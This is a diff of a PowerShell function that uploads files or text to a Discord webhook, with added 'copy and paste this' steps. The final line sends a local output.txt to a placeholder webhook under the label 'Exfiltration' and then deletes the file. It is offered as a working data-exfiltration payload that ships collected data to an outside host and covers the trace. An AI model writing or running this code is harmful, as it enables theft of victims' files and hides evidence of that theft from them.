@@ -1,3 +1,4 @@
+# Step 1: Define the corrected function (copy and paste this)
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -9,7 +10,6 @@ function Upload-Discord {
         [string]$DiscordUrl
     )
 
-    # Validate that at least one parameter is provided
     if ([string]::IsNullOrEmpty($text) -and [string]::IsNullOrEmpty($file)) {
         Write-Error "Either 'text' or 'file' parameter must be provided"
         return
@@ -28,7 +28,6 @@ function Upload-Discord {
 
         if (-not ([string]::IsNullOrEmpty($file))) {
             if (Test-Path $file) {
-                # Use curl for file uploads (more reliable)
                 curl.exe -F "file1=@$file" $DiscordUrl
                 Write-Host "File uploaded successfully"
             } else {
@@ -40,3 +39,6 @@ function Upload-Discord {
         Write-Error "Failed to send to Discord: $($_.Exception.Message)"
     }
 }
+
+# Step 2: Use this command (replace YOUR_WEBHOOK_URL with your actual webhook)
+Upload-Discord -file "$dir\output.txt" -text "Exfiltration" -DiscordUrl "YOUR_WEBHOOK_URL"; Remove-Item "$dir\output.txt"
